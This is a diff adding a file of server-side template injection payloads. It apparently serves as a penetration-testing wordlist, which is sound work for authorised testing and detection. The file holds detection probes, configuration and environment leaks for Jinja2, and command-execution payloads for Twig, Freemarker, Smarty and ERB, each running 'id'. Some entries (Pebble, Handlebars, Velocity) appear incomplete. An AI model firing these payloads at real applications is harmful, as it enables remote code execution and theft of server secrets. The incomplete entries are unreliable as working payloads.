@@ -1,0 +1,29 @@
+# Server-Side Template Injection Payloads
+# Detection probes
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{7*'7'}}
+# Jinja2 (Python)
+{{config}}
+{{config.items()}}
+{{request.environ}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+# Twig (PHP)
+{{_self.env.display("id")}}
+# Freemarker (Java)
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+# Pebble (Java)
+{% set cmd = 'id' %}
+# Handlebars
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}
+# Smarty (PHP)
+{php}echo `id`;{/php}
+# ERB (Ruby)
+<%= system("id") %>
+<%= `id` %>
+# Velocity (Java)
+#set($x='')##
